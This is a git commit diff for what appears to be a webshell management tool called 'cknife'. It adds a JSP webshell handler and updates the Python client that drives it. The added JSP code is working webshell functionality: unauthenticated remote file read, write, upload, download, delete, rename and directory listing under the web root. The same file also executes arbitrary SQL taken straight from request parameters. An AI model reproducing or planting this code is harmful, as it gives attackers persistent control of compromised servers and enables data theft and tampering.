d9f6666f421dc90a96372e7b367748a64dad324b
chenguang552 <chenguang552@hotmail.com>
2019-03-23 23:09:37 +0800

    jsp文件操作完成

--- cknifeService.jsp
+++ cknifeService.jsp
@@ -48,9 +48,8 @@
 		PreparedStatement ptmt = conn.prepareStatement(request.getParameter("sql"));
 		ResultSet rs = ptmt.executeQuery(request.getParameter("sql"));
 		ResultSetMetaData rsmd = rs.getMetaData();
-		if (request.getParameter("type").equals("insert")||
-				request.getParameter("type").equals("update")||
-				request.getParameter("type").equals("delete")) {
+		if (request.getParameter("type").equals("insert") || request.getParameter("type").equals("update")
+				|| request.getParameter("type").equals("delete")) {
 			int row = ptmt.executeUpdate();
 			if (row == 0) {
 				out.print("false");
@@ -79,19 +78,205 @@
 		}
 	}
 
-	if (act.equals("")) {
-		out.print("");
-	}
+	if (act.equals("file")) {
+		//URL xmlpath = this.getClass().getClassLoader().getResource("."); 
+		//System.out.println(xmlpath); 
+		//String path=request.getRequestURI();
+		String path = request.getRealPath("");
+		switch (request.getParameter("ds")) {
+		case "read":
+			FileInputStream inputStream = null;
+			Scanner sc = null;
+			try {
+			    inputStream = new FileInputStream(path+request.getParameter("cpath")+request.getParameter("c1"));
+			    //if(inputStream.exists()){out.print("not existed!");break;}
+			    sc = new Scanner(inputStream, "UTF-8");
+			    while (sc.hasNextLine()) {
+			        String line = sc.nextLine();
+			        out.println(line);
+			    }
+			    // note that Scanner suppresses exceptions
+			    if (sc.ioException() != null) {
+			        throw sc.ioException();
+			    }
+			} finally {
+			    if (inputStream != null) {
+			        inputStream.close();
+			    }
+			    if (sc != null) {
+			        sc.close();
+			    }
+			}
+			break;
+		case "delete":
+			File fileDe = new File(path+request.getParameter("cpath")+request.getParameter("c1"));
+	        if (!fileDe.exists()) {
+	            out.println("false:" + request.getParameter("c1") + " not existed!");
+	        } else {
+	            if (fileDe.isFile()){
+	                fileDe.delete();
+	                out.println("done!");
+	            }
+	            else
+	                out.println("dir can't delete!");
+	        };
+			break;
+		case "mkdir":
+			File fileMD = new File(path+request.getParameter("cpath")+request.getParameter("c1"));
+			 if (!fileMD.exists()) {
+		            fileMD.mkdirs();
+		            if (!fileMD.exists()) out.println("false!");
+		            else out.println("done!");
+		        } else {
+		            out.println("dir existed!");
+		        };
+			break;
+		case "rmdir":
+			File fileDr = new File(path+request.getParameter("cpath")+request.getParameter("c1"));
+	        if (!fileDr.exists()) {
+	            out.println("false:" + request.getParameter("c1") + " not existed!");
+	        } else {
+	            if (fileDr.isFile())
+	            	out.println("it's file,can't delete!");
+	            else{
+	            	fileDr.delete();
+	            	out.println("done!");
+	       		 }
+	        };
+			break;
+		case "mkfile":
+			File fileFl = new File(path+request.getParameter("cpath")+request.getParameter("c1"));
+			if(!fileFl.exists()){
+				boolean rec = fileFl.createNewFile();
+				if(rec)out.println("done!");
+				else out.println("false!");
+			}else{
+				out.println("file is existed!");
+			}
+			break;
+		case "dir":
+			File dir = new File(path+request.getParameter("cpath"));
+			File[] files = dir.listFiles();
+			for (int i = 0; i < files.length; i++) {
+				if (!files[i].isDirectory())
+					out.println(files[i].getName());
+				else
+					out.println("[" + files[i].getName() + "]");
+			}
+			break;
+		case "pwd":
+			out.print(path+request.getParameter("cpath"));
+			break;
+		case "rename":
+			File oldFile=new File(path+request.getParameter("cpath")+request.getParameter("c1")); 
+            File newFile=new File(path+request.getParameter("cpath")+request.getParameter("c2")); 
+			 if(!request.getParameter("c1").equals(request.getParameter("c2"))){ 
+		            if(!oldFile.exists()){
+		            	out.println(request.getParameter("c1")+" unexisted!"); 
+		            }
+		            if(newFile.exists()) 
+		                out.println(request.getParameter("c2")+" existed!"); 
+		            else{ 
+		                oldFile.renameTo(newFile); 
+		                out.println("done!");
+		            } 
+		        }else{
+		            out.println("no change!");
+		        }
+			break;
+		case "copy":
+            	try{
+            		File oldCP=new File(path+request.getParameter("cpath")+request.getParameter("c1")); 
+                	File newCP=new File(path+request.getParameter("cpath")+request.getParameter("c2")); 
+            		newCP.createNewFile();
+            		FileInputStream c=new FileInputStream(oldCP);
+            		FileOutputStream d=new FileOutputStream(newCP);
+            		byte[] date=new byte[512];
+            		int i=0;
+            		while((i=c.read(date))>0){
+            			d.write(date);
+            			}
+            		c.close();
+            		d.close();
+            		out.println("done!");
+            	}catch(IOException e){
+            		e.printStackTrace();
+            	}
+			break;
+		case "write":
+			try{
+			      File fileW =new File(path+request.getParameter("cpath")+request.getParameter("c1"));
+			      if(!fileW.exists()){
+			       fileW.createNewFile();
+			      }
+			      FileWriter fileWritterW = new FileWriter(path+request.getParameter("cpath")+request.getParameter("c1"));
+			      fileWritterW.write(request.getParameter("c2"));
+			      //fileWritterW.write("ggggggggggggggggg");
+			      fileWritterW.close();
 
-	if (act.equals("")) {
-		out.print("");
-	}
+			      out.println("done!");
 
-	if (act.equals("")) {
-		out.print("");
-	}
+			     }catch(IOException e){
+			      e.printStackTrace();
+			     };
+			break;
+		case "writeto":
+			try{
+			      File fileWt =new File(path+request.getParameter("cpath")+request.getParameter("c1"));
+			      if(!fileWt.exists()){
+			       fileWt.createNewFile();
+			      }
+			      FileWriter fileWritterWt = new FileWriter(path+request.getParameter("cpath")+request.getParameter("c1"),true);
+			      fileWritterWt.write(request.getParameter("c2"));
+			      fileWritterWt.close();
 
-	if (act.equals("")) {
-		out.print("");
+			      out.println("done!");
+
+			     }catch(IOException e){
+			      e.printStackTrace();
+			     };
+			break;
+		case "upload":
+			out.println("upload");
+			try{
+			      File fileu =new File(path+request.getParameter("cpath")+request.getParameter("c1"));
+			      if(!fileu.exists()){
+			       fileu.createNewFile();
+			      }
+			      FileWriter fileWritteru = new FileWriter(path+request.getParameter("cpath")+request.getParameter("c1"));
+			      fileWritteru.write(request.getParameter("c2"));
+			      fileWritteru.close();
+
+			      out.println("done!");
+
+			     }catch(IOException e){
+			      e.printStackTrace();
+			     };
+			break;
+		case "download":
+			FileInputStream inputStreamD = null;
+			Scanner scD = null;
+			try {
+			    inputStreamD = new FileInputStream(path+request.getParameter("cpath")+request.getParameter("c1"));
+			    scD = new Scanner(inputStreamD, "UTF-8");
+			    while (scD.hasNextLine()) {
+			        String lineD = scD.nextLine();
+			        out.println(lineD);
+			    }
+			    if (scD.ioException() != null) {
+			        throw scD.ioException();
+			    }
+			} finally {
+			    if (inputStreamD != null) {
+			        inputStreamD.close();
+			    }
+			    if (scD != null) {
+			        scD.close();
+			    }
+			};
+			break;
+		default:
+			break;
+		}
 	}
 %>
--- util/fileManager.py
+++ util/fileManager.py
@@ -27,7 +27,7 @@ class fileManager:
         if self.con.getTyp()=="jsp":
             baseCodeForFile=fileC.JSP_fileBaseCode
         if self.con.getTyp()=="asp":
-            baseCodeForFile=fileC.ASP_fileBaseCode
+            pass
         #print(baseCodeForFile)
         return baseCodeForFile
 
@@ -39,33 +39,42 @@ class fileManager:
     def path(self,re):
         if self.con.getTyp()=="php":
             getpath = fileC.PHP_GETPATH
+            getpath = getpath.replace('@@',self.changePath(),1)
+            date = { self.key : getpath }
+            commit = re.post(self.connect,date)
+            return commit.text
         if self.con.getTyp()=="jsp":
             getpath = fileC.JSP_GETPATH
+            #date = { self.key : 'file','ds':getpath}
+            date = { self.key : "file",'cpath':self.changePath(),'ds':getpath}
+            commit = re.post(self.connect,date)
+            return commit.text
         if self.con.getTyp()=="asp":
-            getpath = fileC.ASP_GETPATH
-        getpath = getpath.replace('@@',self.changePath(),1)
-        date = { self.key : getpath }
-        commit = re.post(self.connect,date)
-        # print(commit.text)
-        return commit.text
+            pass
+        
 
     def changePath(self):
         j = 0
         str = self.CHANGE_PATH[0]
+        
+        if self.con.getTyp()=="php":
+            line='/'
+        if self.con.getTyp()=="jsp":
+            line='\\'
         while j!=self.i:
             j = j + 1
-            str = str + '/' + self.CHANGE_PATH[j]
+            str = str + self.CHANGE_PATH[j]+ line 
         if self.con.getTyp()=="php":
             changePach_ = fileC.PHP_CHDIR.replace('##',str,1)
         if self.con.getTyp()=="jsp":
-            changePach_ = fileC.PHP_CHDIR.replace('##',str,1)
+            changePach_ = str
         if self.con.getTyp()=="asp":
-            changePach_ = fileC.PHP_CHDIR.replace('##',str,1)
+            pass
         return changePach_
 
     def FileMain(self,re):
         self.i = 0
-        self.CHANGE_PATH = dict.fromkeys(range(1024),'.')
+        self.CHANGE_PATH = dict.fromkeys(range(1024),'')
         while True:
             self.PATH = self.path(re)+" >"
             # print(PATH)
@@ -84,14 +93,15 @@ class fileManager:
                         self.CHANGE_PATH[self.i] = flag[1]
                         if self.con.getTyp()=="php":
                             CD = fileC.PHP_CD.replace('@@',self.changePath(),1)
+                            date = { self.key : CD }
+                            commit = re.post(self.connect,date)
                         if self.con.getTyp()=="jsp":
-                            CD = fileC.JSP_CD.replace('@@',self.changePath(),1)
+                            pass
                         if self.con.getTyp()=="asp":
-                            CD = fileC.ASP_CD.replace('@@',self.changePath(),1)
-                        date = { self.key : CD }
-                        commit = re.post(self.connect,date)
+                            pass
+                        
                         # print(commit.text)
-                    elif flag[1] != '.':
+                    elif flag[1] != '.' and self.i != 0:
                         self.i = self.i - 1
                     continue
                 else:
@@ -101,14 +111,14 @@ class fileManager:
                 if self.check(flag)>1:
                     if self.con.getTyp()=="php":
                         READ_r = fileC.PHP_READ.replace('##',flag[1],1)
+                        READ_r = READ_r.replace('@@',self.changePath(),1)
+                        date = { self.key : READ_r }
                     if self.con.getTyp()=="jsp":
-                        READ_r = fileC.JSP_READ.replace('##',flag[1],1)
+                        READ_r = fileC.JSP_READ
+                        date = { self.key : "file",'cpath':self.changePath(),'ds':READ_r,'c1':flag[1]}
                     if self.con.getTyp()=="asp":
-                        READ_r = fileC.ASP_READ.replace('##',flag[1],1)
-                    READ_r = READ_r.replace('@@',self.changePath(),1)
-                    # print(READ_r)
-                    date = { self.key : READ_r }
-                    #date = { self.key : fileC.PHP_test }
+                        pass
+                   
                     commit = re.post(self.connect,date)
                     print(commit.text,"\n")
                     continue
@@ -119,14 +129,14 @@ class fileManager:
                 if self.check(flag)>1:
                     if self.con.getTyp()=="php":
                         delete = fileC.PHP_DELETE.replace('##',flag[1],1)
+                        delete = delete.replace('@@',self.changePath(),1)
+                        date = { self.key : delete }
                     if self.con.getTyp()=="jsp":
-                        delete = fileC.JSP_DELETE.replace('##',flag[1],1)
+                        delete = fileC.JSP_DELETE
+                        date = { self.key : "file",'cpath':self.changePath(),'ds':delete,'c1':flag[1]}
                     if self.con.getTyp()=="asp":
-                        delete = fileC.ASP_DELETE.replace('##',flag[1],1)
-                    delete = delete.replace('@@',self.changePath(),1)
-                    # print(READ_r)
-                    date = { self.key : delete }
-                    #date = { self.key : fileC.PHP_test }
+                        pass
+                    
                     commit = re.post(self.connect,date)
                     print(commit.text,"\n")
                     continue
@@ -137,14 +147,14 @@ class fileManager:
                 if self.check(flag)>1:
                     if self.con.getTyp()=="php":
                         mkdir = fileC.PHP_MKDIR.replace('##',flag[1],1)
+                        mkdir = mkdir.replace('@@',self.changePath(),1)
+                        date = { self.key : mkdir }
                     if self.con.getTyp()=="jsp":
-                        mkdir = fileC.JSP_MKDIR.replace('##',flag[1],1)
+                        mkdir = fileC.JSP_MKDIR
+                        date = { self.key : "file",'cpath':self.changePath(),'ds':mkdir,'c1':flag[1]}
                     if self.con.getTyp()=="asp":
-                        mkdir = fileC.ASP_MKDIR.replace('##',flag[1],1)
-                    mkdir = mkdir.replace('@@',self.changePath(),1)
-                    # print(READ_r)
-                    date = { self.key : mkdir }
-                    #date = { self.key : fileC.PHP_test }
+                        pass
+                    
                     commit = re.post(self.connect,date)
                     print(commit.text,"\n")
                     continue
@@ -155,14 +165,14 @@ class fileManager:
                 if self.check(flag)>1:
                     if self.con.getTyp()=="php":
                         rmdir = fileC.PHP_RMDIR.replace('##',flag[1],1)
+                        rmdir = rmdir.replace('@@',self.changePath(),1)
+                        date = { self.key : rmdir }
                     if self.con.getTyp()=="jsp":
-                        rmdir = fileC.JSP_RMDIR.replace('##',flag[1],1)
+                        rmdir = fileC.JSP_RMDIR
+                        date = { self.key : "file",'cpath':self.changePath(),'ds':rmdir,'c1':flag[1]}
                     if self.con.getTyp()=="asp":
-                        rmdir = fileC.ASP_RMDIR.replace('##',flag[1],1)
-                    rmdir = rmdir.replace('@@',self.changePath(),1)
-                    # print(READ_r)
-                    date = { self.key : rmdir }
-                    #date = { self.key : fileC.PHP_test }
+                        pass
+                    
                     commit = re.post(self.connect,date)
                     print(commit.text,"\n")
                     continue
@@ -173,14 +183,13 @@ class fileManager:
                 if self.check(flag)>1:
                     if self.con.getTyp()=="php":
                         mkfile = fileC.PHP_MKFILE.replace('##',flag[1],1)
+                        mkfile = mkfile.replace('@@',self.changePath(),1)
+                        date = { self.key : mkfile }
                     if self.con.getTyp()=="jsp":
-                        mkfile = fileC.JSP_MKFILE.replace('##',flag[1],1)
+                        mkfile = fileC.JSP_MKFILE
+                        date = { self.key : "file",'cpath':self.changePath(),'ds':mkfile,'c1':flag[1]}
                     if self.con.getTyp()=="asp":
-                        mkfile = fileC.ASP_MKFILE.replace('##',flag[1],1)
-                    mkfile = mkfile.replace('@@',self.changePath(),1)
-                    # print(READ_r)
-                    date = { self.key : mkfile }
-                    #date = { self.key : fileC.PHP_test }
+                        pass
                     commit = re.post(self.connect,date)
                     print(commit.text,"\n")
                     continue
@@ -190,12 +199,13 @@ class fileManager:
             if flag[0] == 'ls' or flag[0] == 'dir':
                 if self.con.getTyp()=="php":
                     dir = fileC.PHP_GETDIR
+                    dir = dir.replace('@@',self.changePath(),1)
+                    date = { self.key : dir }
                 if self.con.getTyp()=="jsp":
                     dir = fileC.JSP_GETDIR
+                    date = { self.key : "file",'cpath':self.changePath(),'ds':dir}
                 if self.con.getTyp()=="asp":
-                    dir = fileC.ASP_GETDIR
-                dir = dir.replace('@@',self.changePath(),1)
-                date = { self.key : dir }
+                    pass
                 commit = re.post(self.connect,date)
                 print(commit.text,"\n")
                 continue
@@ -203,12 +213,14 @@ class fileManager:
             if flag[0] == 'pwd' or flag[0] == 'cwd':
                 if self.con.getTyp()=="php":
                     pwd = fileC.PHP_GETPATH
+                    pwd = pwd.replace('@@',self.changePath(),1)
+                    date = { self.key : pwd }
                 if self.con.getTyp()=="jsp":
                     pwd = fileC.JSP_GETPATH
+                    date = { self.key : "file",'cpath':self.changePath(),'ds':pwd}
                 if self.con.getTyp()=="asp":
-                    pwd = fileC.ASP_GETPATH
-                pwd = pwd.replace('@@',self.changePath(),1)
-                date = { self.key : pwd }
+                    pass
+                
                 commit = re.post(self.connect,date)
                 print(commit.text,"\n")
                 continue
@@ -217,13 +229,14 @@ class fileManager:
                 if self.check(flag)>2:
                     if self.con.getTyp()=="php":
                         rename = fileC.PHP_RENAME.replace('#1',flag[1],1)
+                        rename = rename.replace("#2",flag[2])
+                        rename = rename.replace('@@',self.changePath(),1)
+                        date = { self.key : rename }
                     if self.con.getTyp()=="jsp":
-                        rename = fileC.JSP_RENAME.replace('#1',flag[1],1)
+                        rename = fileC.JSP_RENAME
+                        date = { self.key : "file",'cpath':self.changePath(),'ds':rename,'c1':flag[1],'c2':flag[2] }
                     if self.con.getTyp()=="asp":
-                        rename = fileC.ASP_RENAME.replace('#1',flag[1],1)
-                    rename = rename.replace("#2",flag[2])
-                    rename = rename.replace('@@',self.changePath(),1)
-                    date = { self.key : rename }
+                        pass
                     commit = re.post(self.connect,date)
                     print(commit.text,"\n")
                     continue
@@ -234,13 +247,15 @@ class fileManager:
                 if self.check(flag)>2:
                     if self.con.getTyp()=="php":
                         copy = fileC.PHP_COPY.replace('#1',flag[1],1)
+                        copy = copy.replace("#2",flag[2])
+                        copy = copy.replace('@@',self.changePath(),1)
+                        date = { self.key : copy }
                     if self.con.getTyp()=="jsp":
-                        copy = fileC.JSP_COPY.replace('#1',flag[1],1)
+                        copy = fileC.JSP_COPY
+                        date = { self.key : "file",'cpath':self.changePath(),'ds':copy,'c1':flag[1],'c2':flag[2] }
                     if self.con.getTyp()=="asp":
-                        copy = fileC.ASP_COPY.replace('#1',flag[1],1)
-                    copy = copy.replace("#2",flag[2])
-                    copy = copy.replace('@@',self.changePath(),1)
-                    date = { self.key : copy }
+                        pass
+                    
                     commit = re.post(self.connect,date)
                     print(commit.text,"\n")
                     continue
@@ -249,15 +264,50 @@ class fileManager:
 
             if flag[0] == 'write':
                 if self.check(flag)>2:
+                    num = len(flag)
+                    strw = flag[2]
+                    n = 3
+                    while  n != num:
+                        strw = strw + ' ' + flag[n]
+                        n = n + 1
+                    print(strw)
                     if self.con.getTyp()=="php":
                         write = fileC.PHP_WRITE.replace('#1',flag[1],1)
+                        write = write.replace("#2",strw,1)
+                        write = write.replace('@@',self.changePath(),1)
+                        date = { self.key : write }
                     if self.con.getTyp()=="jsp":
-                        write = fileC.JSP_WRITE.replace('#1',flag[1],1)
+                        write = fileC.JSP_WRITE
+                        date = { self.key : "file",'cpath':self.changePath(),'ds':write,'c1':flag[1],'c2':strw }
                     if self.con.getTyp()=="asp":
-                        write = fileC.ASP_WRITE.replace('#1',flag[1],1)
-                    write = write.replace("#2",flag[2],1)
-                    write = write.replace('@@',self.changePath(),1)
-                    date = { self.key : write }
+                       pass
+                    
+                    commit = re.post(self.connect,date)
+                    print(commit.text,"\n")
+                    continue
+                else:
+                    continue
+
+            if flag[0] == 'writeto':
+                if self.check(flag)>2:
+                    num = len(flag)
+                    str1 = flag[2]
+                    n = 3
+                    while  n != num:
+                        str1 = str1 + ' ' + flag[n]
+                        n = n + 1
+                    print(str1)
+                    if self.con.getTyp()=="php":
+                        writeto = fileC.PHP_WRITETO.replace('#1',flag[1],1)
+                        writeto = writeto.replace("#2",str1)
+                        writeto = writeto.replace('@@',self.changePath(),1)
+                        date = { self.key : writeto }
+                    if self.con.getTyp()=="jsp":
+                        writeto = fileC.JSP_WRITETO
+                        date = { self.key : "file",'cpath':self.changePath(),'ds':writeto,'c1':flag[1],'c2':flag[2] }
+                    if self.con.getTyp()=="asp":
+                        pass
+                    
                     commit = re.post(self.connect,date)
                     print(commit.text,"\n")
                     continue
@@ -265,19 +315,22 @@ class fileManager:
                     continue
 
             if flag[0] == 'upload':
-                if self.check(flag)>2:
+                if self.check(flag)>1:
+                    print(flag[1])
+                    file1 = open(flag[1],'rb')
+                    strofupdate = file1.read()
+                    print("upload....")
                     if self.con.getTyp()=="php":
                         update = fileC.PHP_UPLOAD.replace('#1',flag[1],1)
+                        update = update.replace('#2',strofupdate,1)
+                        update = update.replace('@@',self.changePath(),1)
+                        date = { self.key : update }
                     if self.con.getTyp()=="jsp":
-                        update = fileC.JSP_UPLOAD.replace('#1',flag[1],1)
+                        update = fileC.JSP_UPLOAD
+                        date = { self.key : "file",'cpath':self.changePath(),'ds':update,'c1':flag[1],'c2':strofupdate }
                     if self.con.getTyp()=="asp":
-                        update = fileC.ASP_UPLOAD.replace('#1',flag[1],1)
+                        pass
                     #将本地路径所指文件读出到strofupdate
-                    file1 = open(flag[2])
-                    strofupdate = file1.read()
-                    update = update.replace('#2',strofupdate,1)
-                    update = update.replace('@@',self.changePath(),1)
-                    date = { self.key : update }
                     commit = re.post(self.connect,date)
                     print(commit.text,"\n")
                     file1.close()
@@ -289,12 +342,14 @@ class fileManager:
                 if self.check(flag)>1:
                     if self.con.getTyp()=="php":
                         download = fileC.PHP_READ.replace('@@',self.changePath(),1)
+                        download = download.replace('##',flag[1],1)
+                        date = { self.key : download }
                     if self.con.getTyp()=="jsp":
-                        download = fileC.JSP_READ.replace('@@',self.changePath(),1)
+                        download = fileC.JSP_READ
+                        date = { self.key : "file",'cpath':self.changePath(),'ds':download,'c1':flag[1]}
                     if self.con.getTyp()=="asp":
-                        download = fileC.ASP_READ.replace('@@',self.changePath(),1)
-                    download = download.replace('##',flag[1],1)
-                    date = { self.key : download }
+                        pass
+                   
                     commit = re.post(self.connect,date)
                     #filedown = '/download/'
                     filedown =str(random.randint(100000,999999)) + '_' + flag[1]
@@ -303,31 +358,6 @@ class fileManager:
                     file2.write(commit.text)
                     print('done')
                     file2.close()
-                    continue
-                else:
-                    continue
-
-
-            if flag[0] == 'writeto':
-                if self.check(flag)>2:
-                    if self.con.getTyp()=="php":
-                        writeto = fileC.PHP_WRITETO.replace('#1',flag[1],1)
-                    if self.con.getTyp()=="jsp":
-                        writeto = fileC.JSP_WRITETO.replace('#1',flag[1],1)
-                    if self.con.getTyp()=="asp":
-                        writeto = fileC.ASP_WRITETO.replace('#1',flag[1],1)
-                    num = len(flag)
-                    str1 = flag[2]
-                    n = 3
-                    while  n != num:
-                        str1 = str1 + ' ' + flag[n]
-                        n = n + 1
-                    print(str1)
-                    writeto = writeto.replace("#2",str1)
-                    writeto = writeto.replace('@@',self.changePath(),1)
-                    date = { self.key : writeto }
-                    commit = re.post(self.connect,date)
-                    print(commit.text,"\n")
                     continue
                 else:
                     continue
